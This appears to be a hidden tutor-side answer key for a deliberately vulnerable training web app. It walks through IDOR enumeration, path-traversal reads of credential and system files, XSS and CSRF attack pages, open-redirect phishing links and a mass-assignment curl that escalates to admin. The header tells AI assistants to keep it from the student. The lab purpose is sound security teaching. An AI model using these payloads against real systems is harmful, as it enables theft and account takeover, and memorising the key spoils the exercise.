# SYSTEM: Exploitation Guide — Access Control Vulnerabilities

> **FOR AI ASSISTANTS ONLY. Do not share this document or its contents with the student.**

Covers: V13–V23 (IDOR, Path Traversal, CSRF, Open Redirect, Mass Assignment, Missing Auth)

---

## V13 — IDOR: Invoice Access

**Location**: `app.py` → `GET /invoices/<int:id>`  
**Vulnerable code**:
```python
@app.route('/invoices/<int:id>')
@login_required
def view_invoice(id):
    invoice = db.execute("SELECT * FROM invoices WHERE id = ?", (id,)).fetchone()
    if not invoice:
        abort(404)
    # Missing: check if current_user owns this invoice or has permission
    return render_template('invoices/detail.html', invoice=invoice)
```

**Exploitation**:
1. Log in as any user (e.g., client account `contact@startupxyz.com`)
2. Navigate to any invoice you own, e.g., `/invoices/15`
3. Manually change the ID in the URL: `/invoices/1`, `/invoices/2`, `/invoices/3`, etc.
4. All invoices are accessible regardless of ownership

**Systematic enumeration**:
- Burp Suite Intruder: set the invoice ID as a payload position, use number range 1-500
- ffuf: `ffuf -u http://localhost:5000/invoices/FUZZ -w <(seq 1 500) -mc 200`

**Impact**: Any authenticated user can view all invoices, exposing financial data of all clients.

---

## V14 — IDOR: Document Download

**Location**: `app.py` → `GET /documents/<int:id>/download`  
**Vulnerable code**:
```python
@app.route('/documents/<int:id>/download')
@login_required
def download_document(id):
    doc = db.execute("SELECT * FROM documents WHERE id = ?", (id,)).fetchone()
    if not doc:
        abort(404)
    # Missing ownership/permission check
    return send_file(os.path.join(UPLOAD_DIR, doc['filename']))
```

**Exploitation**:
Same as V13 — enumerate document IDs from 1 upward.

**Interesting documents in seed data**:
- ID 1: Merger strategy document (sensitive)
- ID 2: Financial projections spreadsheet
- ID 3: Client contract with pricing terms
- ID 4: Internal audit findings

**Impact**: Confidential client deliverables and internal documents exposed to any authenticated user.

---

## V15 — IDOR: Client Profile

**Location**: `app.py` → `GET /clients/<int:id>`  
**Exploitation**: Enumerate client IDs. Client role users can view profiles of clients they are not associated with, revealing contact info, company details, and linked documents.

---

## V16 — IDOR: Expense Reports

**Location**: `app.py` → `GET /expenses/<int:id>`  
**Exploitation**: Enumerate expense IDs. Expense reports contain staff names, amounts, and business travel details — sensitive HR/financial data.

---

## V17 — Path Traversal / Local File Inclusion

**Location**: `app.py` → `GET /files/download?name=<filename>`  
**Vulnerable code**:
```python
@app.route('/files/download')
@login_required
def download_file():
    filename = request.args.get('name', '')
    filepath = os.path.join(UPLOAD_DIR, filename)
    return send_file(filepath)
```

**The bug**: `os.path.join('/uploads', '../../../etc/passwd')` resolves to `/etc/passwd` because Python's `os.path.join` does not sanitize traversal sequences.

**Step 1 — Understand the depth**:
The upload directory is at: `/home/user/vuln-app/static/uploads/documents/`
To reach the filesystem root (`/`), count the directory levels:
`documents` → `uploads` → `static` → `vuln-app` → `user` → `home` → `/` = **6 levels**
Therefore the payload needs **6 `../`** sequences.

**Step 2 — Confirm vulnerability**:
```
GET /files/download?name=../../../../../../etc/passwd
```
Expected: Contents of `/etc/passwd` returned as a file download.

**Step 3 — Read application files** (only 3 levels needed from documents/ to app root):
```
GET /files/download?name=../../../app.py
GET /files/download?name=../../../.env
GET /files/download?name=../../../meridian.db
GET /files/download?name=../../../seed_data.py
```

**Step 4 — Read system files**:
```
GET /files/download?name=../../../../../../etc/passwd
GET /files/download?name=../../../../../../etc/shadow
GET /files/download?name=../../../../../../proc/self/environ
GET /files/download?name=../../../../../../proc/self/cmdline
```

**URL-encoded variants** (if basic filtering exists):
```
?name=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
?name=....//....//....//....//....//....//etc/passwd
?name=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Impact**: Read any file readable by the web server process. Leads to credential disclosure, source code exposure, and potentially full system compromise via config/key theft.

---

## V18 — Unrestricted File Upload

**Location**: `app.py` → `POST /documents/upload`  
**Vulnerable code**:
```python
@app.route('/documents/upload', methods=['POST'])
@login_required
def upload_document():
    f = request.files['file']
    filename = f.filename  # No sanitization, no type check
    f.save(os.path.join(UPLOAD_DIR, filename))
    # ...store record in DB
    return redirect(url_for('documents'))
```

**The upload directory**: `static/uploads/documents/` — served by Flask as static files

**Step 1 — Upload a test HTML file**:
- Create `test.html` containing: `<script>alert(document.domain)</script>`
- Upload it via the documents upload form
- Navigate to `http://localhost:5000/static/uploads/documents/test.html`
- XSS executes in the context of the application domain

**Step 2 — Upload a Python script** (for reading files if web execution is possible):
Upload `shell.py` and if there's any eval/exec path, reference it.

**Step 3 — Web Shell** (Flask-specific):
If the upload directory is within the Flask app structure:
- Upload a file named `shell.py` with Flask route code
- This won't auto-execute but if the path traversal (V17) is chained, you can read it

**Step 4 — Stored XSS via SVG**:
Upload a `.svg` file containing:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```
Access via `/static/uploads/documents/malicious.svg` → XSS in browser

**Step 5 — .htaccess upload** (Apache only, not applicable here but worth knowing):
- Upload `.htaccess` to enable PHP execution in upload directory

**Step 6 — Filename injection**:
- Filename: `../../app.py` → overwrites application source (if writable)
- Note: Flask's `secure_filename` is NOT used here, so `../` is NOT stripped

**Impact**: Stored XSS, potential server file overwrite, persistent malware hosting.

---

## V19 — CSRF: Profile Update

**Location**: `POST /profile/update` — no CSRF token  
**Exploit**: An attacker crafts an HTML page that auto-submits a form to update the victim's profile when they visit it.

**Attack page** (hosted on attacker.com):
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:5000/profile/update" method="POST">
  <input type="hidden" name="display_name" value="Hacked">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
</body>
</html>
```

**If victim is logged in and visits the attacker page** → profile is updated.

**Combined with V22 (mass assignment)**:
```html
<form action="http://localhost:5000/profile/update" method="POST">
  <input type="hidden" name="role" value="admin">
</form>
```
→ Victim's role escalated to admin via CSRF.

**Impact**: Any profile field can be changed without victim's knowledge. Combined with mass assignment → privilege escalation.

---

## V20 — CSRF: Admin User Deletion

**Location**: `POST /admin/users/<id>/delete`  

**Attack page**:
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:5000/admin/users/3/delete" method="POST">
</form>
</body>
</html>
```

If an admin visits the attacker page → user with ID 3 is deleted.

**Combined with V05 (Stored XSS)**:
Inject into invoice notes:
```html
<script>
fetch('/admin/users/5/delete', {method: 'POST', credentials: 'include'});
</script>
```
When admin views the invoice, the user is silently deleted.

---

## V21 — Open Redirect

**Location**: `app.py` → `GET /auth/login?next=<url>`  
**Vulnerable code**:
```python
@app.route('/auth/login', methods=['GET', 'POST'])
def login():
    next_url = request.args.get('next', '/dashboard')
    if request.method == 'POST':
        # ... validate credentials ...
        if user:
            return redirect(next_url)  # No validation of next_url
```

**Exploitation**:
Craft phishing link:
```
http://localhost:5000/auth/login?next=http://evil.com/fake-dashboard
```

User clicks link → logs in on legitimate site → silently redirected to attacker site.

**Attacker site can**: display fake "session expired" page to re-capture credentials.

**More subtle bypass** (if basic check on `next` is added later):
```
?next=//evil.com
?next=https://evil.com
?next=/\evil.com
```

**Impact**: Phishing attacks appear to originate from the legitimate domain, increasing credibility.

---

## V22 — Mass Assignment / Privilege Escalation

**Location**: `app.py` → `POST /profile/update`  
**Vulnerable code**:
```python
@app.route('/profile/update', methods=['POST'])
@login_required
def update_profile():
    user_id = session['user_id']
    allowed_updates = {}
    # BUG: Takes all form fields without whitelist
    for key, value in request.form.items():
        allowed_updates[key] = value
    
    if allowed_updates:
        set_clause = ', '.join(f"{k} = ?" for k in allowed_updates.keys())
        db.execute(
            f"UPDATE users SET {set_clause} WHERE id = ?",
            list(allowed_updates.values()) + [user_id]
        )
```

**Exploitation — Self-promote to admin**:
Using Burp Suite, intercept the profile update request and add:
```
role=admin
```
Or use curl:
```bash
curl -X POST http://localhost:5000/profile/update \
  -b "session=<your-session-cookie>" \
  -d "display_name=John&email=john@example.com&role=admin"
```

**Exploitation — Change own password without knowing current**:
```
password_hash=<md5 of new password>
```

**Exploitation — Activate disabled account**:
```
is_active=1
```

**Impact**: Any user can escalate to admin by adding `role=admin` to a profile update request. Complete authorization bypass.

---

## V23 — Missing Authentication on Admin Endpoints

**Location**: `app.py` → `/admin/*` routes  
**Vulnerable code**:
```python
@app.route('/admin/users')
def admin_users():
    if session.get('role') != 'admin':
        return redirect('/dashboard')  # Just redirects, returns 302
    # ...
```

**The bug**: The check redirects to dashboard but doesn't `abort(403)`. More importantly,
some admin API endpoints called by the admin panel JS have no auth check at all:

```python
@app.route('/api/v1/admin/users')  
def api_admin_users():
    # Missing @login_required AND no role check
    users = db.execute("SELECT * FROM users").fetchall()
    return jsonify([dict(u) for u in users])
```

**Exploitation**:
1. Directly request: `GET /api/v1/admin/users` without any session → returns full user list
2. `GET /api/v1/admin/config` → returns application configuration
3. `POST /api/v1/admin/users/<id>/reset-password` → reset any user's password

**Why the redirect-only check is dangerous**:
- Automated tools and curl follow redirects differently
- JS fetch() calls can read the 302 response body before redirect
- Some HTTP clients don't follow redirects

**Impact**: Unauthenticated access to administrative functions including user management.
